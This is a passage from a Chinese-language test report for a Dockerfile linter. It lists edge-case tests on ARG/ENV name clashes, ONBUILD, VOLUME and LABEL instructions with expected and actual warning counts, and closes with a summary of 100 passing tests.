| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #97: 边缘: ARG 有默认值但 ENV 同名

**类别**: Edge

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ARG VERSION=1.0
ENV VERSION=2.0
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 3 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 3 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #98: 边缘: ONBUILD 指令

**类别**: Edge

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ONBUILD COPY . /app
ONBUILD RUN npm install
ONBUILD CMD ["node", "app.js"]
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #99: 边缘: VOLUME 指令

**类别**: Edge

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
VOLUME /data /app/logs
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #100: 边缘: LABEL 指令

**类别**: Edge

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
LABEL maintainer="developer@example.com"
LABEL version="1.0"
LABEL description="Test application"
CMD ["node", "app.js"]
USER node
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试总结

**总测试数**: 100
**通过**: 100
**失败**: 0
**通过率**: 100.0%

### 按类别统计

| 类别 | 通过 | 失败 | 通过率 |
|------|------|------|--------|
| FROM | 10 | 0 | 100.0% |
| CMD | 5 | 0 | 100.0% |
| ENTRYPOINT | 3 | 0 | 100.0% |
| CMD+ENTRYPOINT | 3 | 0 | 100.0% |
| COPY | 10 | 0 | 100.0% |
| ADD | 2 | 0 | 100.0% |
| RUN | 17 | 0 | 100.0% |
| ENV | 6 | 0 | 100.0% |
| ARG | 5 | 0 | 100.0% |
| EXPOSE | 7 | 0 | 100.0% |
| SHELL | 4 | 0 | 100.0% |
| STOPSIGNAL | 4 | 0 | 100.0% |
| USER | 3 | 0 | 100.0% |
| WORKDIR | 1 | 0 | 100.0% |
| HEALTHCHECK | 2 | 0 | 100.0% |
| Format | 1 | 0 | 100.0% |
| StageResidue | 3 | 0 | 100.0% |
| Combined | 4 | 0 | 100.0% |
| Edge | 10 | 0 | 100.0% |

---

**报告生成时间**: 2026-03-31T03:27:30.192Z